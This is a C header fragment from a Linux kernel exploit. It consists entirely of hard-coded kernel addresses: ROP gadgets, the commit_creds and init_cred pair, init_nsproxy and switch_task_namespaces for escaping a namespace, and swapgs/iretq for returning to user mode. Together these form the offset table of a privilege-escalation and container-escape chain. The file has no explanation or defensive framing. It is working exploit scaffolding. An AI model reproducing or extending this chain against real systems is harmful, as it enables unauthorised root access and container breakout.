#define ARRAY_MAP_OPS_OFF 0xffffffff82c3f800
#define POP_RBX_RET 0xffffffff81f1304f //pop rbx ; ret
#define POP_RDI_RET 0xffffffff8108d025 //pop rdi ; ret
#define INIT_CRED 0xffffffff83c72d40
#define INIT_NSPROXY 0xffffffff83c72860
#define SWITCH_TASK_NAMESPACES 0xffffffff811f3290
#define COMMIT_CREDS 0xffffffff811f55f0
#define FIND_TASK_BY_VPID 0xffffffff811e8d80
#define POP_RSI_RET 0xffffffff8100d010
#define LEAVE_RET 0xffffffff81067f40
#define MOV_RDI_RAX_POP_RBX_RET 0xffffffff810f12a1 // mov rdi, rax ; mov eax, ebx ; pop rbx ; or rax, rdi ; ret
#define SWAGPGS_RET 0xffffffff8241d036
#define IRETQ 0xffffffff8260123e
